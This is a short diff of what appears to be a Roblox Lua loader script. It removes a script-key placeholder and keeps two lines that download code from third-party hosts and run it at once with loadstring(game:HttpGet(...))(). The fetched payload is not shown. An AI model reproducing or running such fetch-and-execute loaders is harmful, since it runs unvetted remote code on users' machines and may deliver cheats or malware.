@@ -68,7 +68,5 @@ task.spawn(function()
 loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc36b7a17d913"))()
 end)
 task.spawn(function()
-script_key = "%KEY%"
-
 loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/15d8107ad59ac6ef1ce14b429416420eb8147baf03c25d4f4e080045f8dcf375.lua"))()
 end) 
